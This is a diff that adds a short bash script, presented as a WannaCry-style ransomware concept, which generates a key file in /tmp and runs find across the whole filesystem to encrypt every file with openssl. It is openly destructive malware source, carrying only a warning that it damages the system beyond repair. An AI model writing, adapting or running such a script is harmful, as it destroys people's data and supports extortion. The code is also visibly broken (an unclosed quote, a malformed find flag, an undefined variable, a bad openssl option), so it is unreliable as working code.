@@ -1,0 +1,26 @@
+#!/bin/bash
+# 
+# This script is based on the concept of wannacry.
+# Do not use this unless you are in a safe enviroment and you know what you are doing
+# This will damage your system beyond repair
+#
+
+input="${1}"
+output="/tmp/${RANDOM}
+keyfile=/tmp/zfile
+
+saveme(){
+victim=$0
+if [ "${entrada}" = "${victim}" ]
+then exit 1
+fi
+echo "${input} ${victim}"
+}
+
+saveme
+
+if [ ! -f "${keyfile}" ]
+then openssl genrsa -out "${keyfile}"
+fi
+
+find / -type -f -exec openssl enc -aes-256-cbc -e -pass=file:${keyfile} -in "{}" -out "${output}" \;
